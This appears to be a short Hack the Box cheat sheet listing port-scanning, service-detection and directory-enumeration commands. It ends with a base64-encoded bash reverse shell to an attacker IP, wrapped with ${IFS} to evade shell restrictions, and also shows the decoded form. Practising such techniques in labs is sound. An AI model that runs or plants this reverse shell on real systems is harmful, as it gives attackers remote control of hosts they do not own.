## Hack the Box Reference.<br>
Contains commands,Link and tricks for challenges<br>
gzip<br>
gzip -d file.gz<br>

masscan probe to establish the open ports in the host.<br>
#masscan -e tun0 -p1-65535,U:1-65535 10.10.10.101 --rate=700<br>

##nmap scanning the discovered ports to see what are the services.##<br>
#nmap -sV -v -O -sS -T5 {target}<br>

##Gobuster Dir enumeration##<br>
```gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 20 -e -x php,htm,html,txt -u http://target```<br>

##bypass-bash-restrictions##<br>
https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions<br>

##Bypass shell restriction using {IFS} and Base 64 encoding 

```echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45NC85MDA3IDA+JjE|base64${IFS}-d|bash${IFS}-;```<br>
it means the highlighted part below is base64 encoded to bypass shell restriction<br>
echo${IFS}**bash -i >& /dev/tcp/10.10.14.94/9007 0>&1**|base64${IFS}-d|bash${IFS}-;<br>
